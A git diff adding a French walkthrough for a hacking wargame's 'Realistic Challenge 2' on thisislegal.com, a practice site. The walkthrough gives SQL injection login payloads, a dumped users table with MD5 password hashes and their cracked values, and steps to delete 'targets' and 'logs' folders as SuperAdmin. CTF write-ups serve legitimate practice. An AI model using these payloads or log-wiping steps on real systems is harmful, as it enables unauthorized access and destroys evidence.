@@ -101,6 +101,41 @@ document.location = "http://www.thisislegal.com/challenge/p1&code=" +result[1];
 utiliser tamper data, cliquer sur le bouton "buy now".
 changer la valeur de "amount".
 
+#Realistic Challenge 2
+login : admin' or username='Admin
+password : ' or 1=1 --
+
+aller sur Back up Database:
+```
+-- Table structure for table `users`
+-- 
+
+CREATE TABLE `users` (
+  `ID` int(2) NOT NULL auto_increment,
+  `Username` varchar(255) NOT NULL,
+  `Password` varchar(255) NOT NULL,
+  `Level_access` varchar(9) NOT NULL,
+  PRIMARY KEY  (`ID`),
+  UNIQUE KEY `Username` (`Username`),
+) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;
+
+-- 
+-- Dumping data for table `users`
+-- 
+
+INSERT INTO `users` (`ID`, `Username`, `Password`, `Level_Access`) VALUES 
+(1, 'Admin', '3819585098e8cfe6c4fe4fcfd3a0fd59', 'Limited'),
+(2, 'SuperAdmin', '8cc4ba204dd44cc92d7646ad035b7647', 'Unlimited')
+```
+Crack des mots de passe avec http://md5cracker.org :
+Admin/xenu5
+SuperAdmin/lmon12
+
+se logguer en SuperAdmin, aller sur File Manager
+
+aller dans misc et supprimer targets
+aller dans images et supprimer logs
+
 #Bonus challenge 1
 afficher la source (CTRL+U)
 ```
